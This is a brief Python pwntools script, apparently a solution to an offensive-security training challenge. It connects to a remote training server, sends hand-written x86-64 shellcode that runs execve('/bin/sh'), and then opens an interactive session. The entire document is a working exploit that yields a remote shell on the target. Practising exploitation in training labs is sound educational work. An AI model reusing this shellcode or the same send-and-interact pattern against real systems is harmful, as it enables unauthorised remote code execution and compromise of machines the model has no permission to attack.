from pwn import *

p = remote("bin.training.offdef.it", 4101)

shell_code = b"\x52\x58\x04\x11\x48\x97\x6A\x3B\x58\x6A\x00\x5E\x6A\x00\x5A\x0F\x05/bin/sh\x00"
p.send(shell_code)

p.interactive()